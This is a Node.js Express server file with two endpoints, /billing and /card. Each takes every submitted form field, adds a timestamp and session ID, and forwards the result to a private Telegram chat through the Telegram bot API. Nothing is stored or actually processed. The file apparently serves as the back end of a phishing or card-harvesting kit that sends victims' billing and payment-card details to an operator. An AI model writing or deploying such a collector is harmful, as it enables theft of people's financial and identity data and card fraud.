import express from "express";
import bodyParser from "body-parser";
import fetch from "node-fetch";
import dotenv from "dotenv";
import crypto from "crypto";

dotenv.config();

const app = express();
app.use(bodyParser.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const PORT = process.env.PORT || 3000;

/**
 * Helper: send to Telegram
 */
async function sendToTelegram(title, data) {
  // Add timestamp
  const timestamp = new Date().toLocaleString("en-GB", { timeZone: "Africa/Lagos" });

  // Add unique ID if not already provided
  if (!data.sessionId) {
    data.sessionId = crypto.randomBytes(4).toString("hex"); // e.g. "9f2c7a1b"
  }

  let text = `📌 ${title}\n\n🕒 Time: ${timestamp}\n🆔 Session ID: ${data.sessionId}\n\n`;
  for (const [key, value] of Object.entries(data)) {
    text += `• ${key}: ${value}\n`;
  }

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text }),
  });
}

/**
 * Billing Form (9 fields)
 */
app.post("/billing", async (req, res) => {
  try {
    await sendToTelegram("🧾 New Billing Form Submission", req.body);
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
});

/**
 * Card Form (4 fields)
 */
app.post("/card", async (req, res) => {
  try {
    await sendToTelegram("💳 New Card Form Submission", req.body);
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Listening on port ${PORT}`);
});
